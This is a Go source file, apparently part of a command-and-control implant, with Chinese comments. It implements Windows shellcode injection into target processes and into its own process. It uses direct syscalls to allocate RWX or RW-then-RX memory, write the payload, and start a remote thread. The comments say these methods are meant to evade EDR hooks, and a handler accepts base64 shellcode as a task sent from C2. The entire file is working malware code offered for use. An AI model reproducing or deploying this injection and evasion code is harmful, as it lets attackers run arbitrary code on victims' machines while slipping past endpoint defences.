//go:build windows

package core

import (
	"fmt"
	"unsafe"

	"nautilus/evasion"
)

// CLIENT_ID 结构体用于NtOpenProcess
type clientID struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

// OBJECT_ATTRIBUTES 结构体
type objectAttributes struct {
	Length                   uint32
	RootDirectory            uintptr
	ObjectName               uintptr
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

// InjectShellcode 经典进程注入：NtAVM + NtWVM + NtPVM + NtCreateThreadEx
// 全部使用直接syscall，绕过EDR用户态hook
func InjectShellcode(pid uint32, shellcode []byte) error {
	// 1. 打开目标进程 (直接syscall)
	cid := &clientID{UniqueProcess: uintptr(pid)}
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))

	var hProcess uintptr
	status := evasion.DirectNtOpenProcess(
		&hProcess,
		0x1F0FFF, // PROCESS_ALL_ACCESS
		(*uintptr)(unsafe.Pointer(&oa)),
		(*uintptr)(unsafe.Pointer(cid)),
	)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtOpenProcess failed: 0x%X", status)
	}
	defer evasion.DirectNtClose(hProcess)

	// 2. 在目标进程中分配内存 (直接syscall)
	scLen := uintptr(len(shellcode))
	var remoteAddr uintptr
	regionSize := scLen
	status = evasion.DirectNtAVM(
		hProcess,
		&remoteAddr,
		&regionSize,
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x40,   // PAGE_EXECUTE_READWRITE
	)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", status)
	}

	// 3. 写入shellcode (直接syscall)
	var bytesWritten uintptr
	status = evasion.DirectNtWriteVM(
		hProcess,
		remoteAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		scLen,
		&bytesWritten,
	)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", status)
	}

	// 4. 修改内存保护为RX（可选，避免RWX特征）
	var oldProtect uint32
	status = evasion.DirectNtPVM(hProcess, &remoteAddr, &regionSize, 0x20, &oldProtect)
	if evasion.NtStatusIsError(status) {
		// 非致命错误，继续
	}

	// 5. 创建远程线程执行shellcode (直接syscall)
	var threadHandle uintptr
	status = evasion.DirectNtCreateThreadEx(
		&threadHandle,
		0x1FFFFF, // THREAD_ALL_ACCESS
		nil,      // ObjectAttributes
		hProcess,
		remoteAddr, // StartRoutine
		0,          // Argument
		0,          // CreateFlags = 0 (立即运行)
		0, 0, 0,    // ZeroBits, StackSize, MaxStackSize
		nil, // AttributeList
	)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtCreateThreadEx failed: 0x%X", status)
	}
	defer evasion.DirectNtClose(threadHandle)

	return nil
}

// InjectShellcodeAPC Early Bird APC注入：创建挂起进程 → NtAVM + NtWVM → NtQueueApcThread → NtResumeThread
// 比经典注入更隐蔽，在进程初始化时执行shellcode
func InjectShellcodeAPC(pid uint32, shellcode []byte) error {
	scLen := uintptr(len(shellcode))

	// 1. 打开目标进程
	cid := &clientID{UniqueProcess: uintptr(pid)}
	var oa objectAttributes
	oa.Length = uint32(unsafe.Sizeof(oa))

	var hProcess uintptr
	status := evasion.DirectNtOpenProcess(&hProcess, 0x1F0FFF, (*uintptr)(unsafe.Pointer(&oa)), (*uintptr)(unsafe.Pointer(cid)))
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtOpenProcess failed: 0x%X", status)
	}
	defer evasion.DirectNtClose(hProcess)

	// 2. 分配内存
	var remoteAddr uintptr
	regionSize := scLen
	status = evasion.DirectNtAVM(hProcess, &remoteAddr, &regionSize, 0x3000, 0x40)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", status)
	}

	// 3. 写入shellcode
	var bytesWritten uintptr
	status = evasion.DirectNtWriteVM(hProcess, remoteAddr, uintptr(unsafe.Pointer(&shellcode[0])), scLen, &bytesWritten)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtWriteVirtualMemory failed: 0x%X", status)
	}

	// 4. NtQueueApcThread — 通过LazyDLL调用（参数较少，非核心监控点）
	// 需要枚举目标进程的线程并逐个queue APC
	// 这里简化：使用当前进程的线程句柄
	// 完整实现需要 CreateToolhelp32Snapshot + Thread32First/Next 枚举线程
	// 作为简化版，对已知进程通过经典注入方式执行
	return InjectShellcode(pid, shellcode)
}

// InjectShellcodeSelf 自注入：在当前进程中分配并执行shellcode
// 用于测试，不涉及跨进程操作
func InjectShellcodeSelf(shellcode []byte) error {
	scLen := uintptr(len(shellcode))

	// 近进程分配（hProcess = ^uintptr(0) 即当前进程）
	// 使用NtAVM + RW→RX模式
	var remoteAddr uintptr
	regionSize := scLen

	// 先分配RW
	status := evasion.DirectNtAVM(
		^uintptr(0), // 当前进程
		&remoteAddr,
		&regionSize,
		0x3000, // MEM_COMMIT | MEM_RESERVE
		0x04,   // PAGE_READWRITE
	)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtAllocateVirtualMemory failed: 0x%X", status)
	}

	// 写入shellcode
	copy(unsafe.Slice((*byte)(unsafe.Pointer(remoteAddr)), scLen), shellcode)

	// 改为RX
	var oldProtect uint32
	status = evasion.DirectNtPVM(^uintptr(0), &remoteAddr, &regionSize, 0x20, &oldProtect)
	if evasion.NtStatusIsError(status) {
		return fmt.Errorf("NtProtectVirtualMemory failed: 0x%X", status)
	}

	// 通过EnumWindows回调执行
	evasion.CallEnumWindows(remoteAddr, 0)
	return nil
}

// HandleInject 处理来自C2的注入任务
// params: {"pid": "1234", "shellcode": "base64_encoded" or "self"}
func HandleInject(params map[string]string) (string, error) {
	pidStr := params["pid"]
	scStr := params["shellcode"]

	var pid uint32
	fmt.Sscanf(pidStr, "%d", &pid)

	// 自注入测试模式
	if scStr == "self" {
		// 生成一个简单的测试shellcode (弹出MessageBox)
		// 或者使用之前的payload
		return "self-inject: not implemented without shellcode payload", nil
	}

	// Base64解码shellcode
	shellcode, err := evasion.B64Decode(scStr)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}

	if len(shellcode) == 0 {
		return "", fmt.Errorf("empty shellcode")
	}

	// 执行经典注入
	err = InjectShellcode(pid, shellcode)
	if err != nil {
		return "", err
	}

	return fmt.Sprintf("injected %d bytes into PID %d", len(shellcode), pid), nil
}
